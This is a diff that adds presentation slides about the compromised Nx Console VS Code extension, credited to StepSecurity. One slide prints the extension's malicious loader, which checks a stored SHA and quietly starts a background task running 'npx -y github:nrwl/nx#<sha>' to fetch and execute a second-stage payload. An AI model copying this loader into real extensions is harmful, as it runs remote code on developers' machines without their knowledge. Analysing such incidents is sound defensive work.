@@ -608,6 +608,66 @@ onUnmounted(() => { _exploded = false })
 
 ---
 transition: fade-out
+layout: two-cols
+---
+
+- The code checks VS Code's globalState for the key `nxConsole.mcpExtensionInstalledSha`. 
+- If the stored value does not match the hardcoded SHA, it creates a background VS Code Task called `install-mcp-extension`
+- The task fetches the Git tree at that SHA from the `nrwl/nx` which delivers the second stage payload
+
+::right::
+
+```js {1-4,20-25|7-18|7}
+var U0 = require("vscode"),
+    G5t = "558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2",
+    xfn = "nxConsole.mcpExtensionInstalledSha",
+    $xs = new Set([127, 9009]); 
+async function Uxs(t, e) {
+    try {
+        let n = `npx -y github:nrwl/nx#${G5t}`,
+            i = new U0.Task({
+                type: "nx"
+            }, U0.TaskScope.Workspace, "install-mcp-extension", "nx", new U0.ShellExecution(n, {
+                cwd: e,
+                env: {
+                    ...process.env,
+                    NX_CONSOLE: "true"
+                }
+            }));
+  // More code to check stuff
+  }
+}
+
+function Efn(t) {
+    if (t.globalState.get(xfn) !== G5t) {
+        let n = U0.workspace.workspaceFolders && U0.workspace.workspaceFolders[0].uri.fsPath;
+        Uxs(t, n ?? void 0)
+    }
+    // Normal nx.init command registration stuff
+}
+
+```
+
+---
+transition: fade-out
+layout: center
+---
+
+![](https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/6a0b762bbe575f3f76590d62_mermaid-diagram-2026-05-18-132704.png)
+
+<div class="absolute bottom-4 left-4 text-xs opacity-60"><a href="https://www.stepsecurity.io/blog/nx-console-vs-code-extension-compromised">Source: StepSecurity</a></div>
+
+---
+transition: fade-out
+layout: center
+---
+
+## TL;DR - Github became _open source_, for a price
+
+![](https://pbs.twimg.com/media/HItbXhvW4AAMD8W.jpg)
+
+---
+transition: fade-out
 layout: center
 ---
 <!-- 
